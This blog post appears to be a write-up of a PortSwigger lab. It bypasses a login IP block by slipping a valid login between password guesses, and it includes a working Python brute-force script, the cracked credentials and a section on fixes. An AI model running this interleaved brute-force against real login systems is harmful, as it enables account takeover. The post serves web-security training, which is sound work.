---
layout: post
title: "PortSwigger: Broken Brute-Force Protection, IP Block"
date: 2027-10-09 09:00:00 -0500
categories: [PortSwigger, WebSecurityAcademy, Authentication]
tags: [portswigger, authentication, brute-force, rate-limiting, login, account-takeover, cwe-307]
---

This lab actually *has* brute-force protection — submit too many wrong passwords in a row and it blocks your IP. The trick is that the block is built on a counter that's trivially resettable, so a normal credential-stuffing run can keep going forever. It's a textbook case of [CWE-307](https://cwe.mitre.org/data/definitions/307.html) (Improper Restriction of Excessive Authentication Attempts), and unlike some of the other rate-limit labs it needs **no header spoofing at all**.

## Overview

The goal is to brute-force the victim `carlos`'s password, log in, and reach his account page.

Hammer the login and you'll eventually get this instead of the usual "Incorrect password":

> You have made too many incorrect login attempts. Please try again in 1 minute(s).

So there's a real defence. But look closely at *how it counts*:

- The block only triggers after **3 failed logins in a row**.
- The counter is **reset to zero the instant any login succeeds**.

In other words, it watches **consecutive failures from your IP** — not the total number of guesses, and not the account you keep hammering.

## The flaw

PortSwigger hands every tester a working account: `wiener:peter`. That means we already own a login that *always* succeeds. If we slip one `wiener:peter` login in between every couple of `carlos` guesses, the "consecutive failures" count never reaches 3 — each success wipes it back to zero.

To the server we look like a slightly clumsy legitimate user who occasionally mistypes a password but always recovers. Meanwhile we quietly grind the whole candidate password list against `carlos`.

This is **not** the `X-Forwarded-For` spoofing bypass you see in other labs — we don't forge a new source IP. We just stay under the limit by laundering the failure counter through our own valid login.

## The login request

The form takes a plain POST with no CSRF token:

```
POST /login
Content-Type: application/x-www-form-urlencoded

username=carlos&password=secret
```

How to read the three possible answers:

| Response | Meaning |
| --- | --- |
| `302` redirect to `/my-account` | **correct password** |
| `200` + "Incorrect password" | wrong password |
| `200` + "too many incorrect login attempts" | IP blocked — send a `wiener:peter` login to clear it |

## The interleaved brute-force

The script alternates a successful reset login between failed guesses so the IP block never trips:

```python
import requests
s = requests.Session()

def login(user, pw):
    return s.post(URL + "/login",
                  data={"username": user, "password": pw},
                  allow_redirects=False, verify=False).status_code

fails = 0
for pw in candidate_passwords:
    if fails >= 2:
        login("wiener", "peter")   # reset the consecutive-failure counter
        fails = 0
    if login("carlos", pw) == 302: # 302 = correct password
        print("FOUND carlos:" + pw)
        break
    fails += 1
```

> **Scripting gotcha:** the success signal is the `302` itself. If you let `requests` (or `urllib`) follow redirects — which they do by default — the `302` is silently chased to a `200` on `/my-account` and you never see the hit. Set `allow_redirects=False`.

The 13th candidate in PortSwigger's password list cracked it: **`carlos:baseball`**. Logging in (`POST /login` → `302`) and then visiting `/my-account` (`200`) flipped the lab status banner straight to **Solved**.

## Why the defence failed

The rate-limiter keyed on the wrong thing. It asked *"how many times in a row has this IP failed?"* — a question any successful login answers with "zero." It never asked the questions that actually matter:

- *How many total failures has this IP racked up recently?*
- *How many failures has anyone aimed at the `carlos` account?*

Because a success from **one** account unlocked guessing against **another**, owning a single throwaway login was enough to neutralise the whole protection.

## The fix

- Rate-limit on a **sliding window of total failures**, per IP **and** per account — not just consecutive ones.
- **Never reset the failure counter on a successful login.** A success on your account must not unlock guessing against someone else's.
- **Lock the targeted username**, not only the source IP, so failures against `carlos` can't be hidden behind successes on the attacker's own account.
- Add an out-of-band factor after a few failures (CAPTCHA, MFA) so raw password guessing alone can't take an account over.
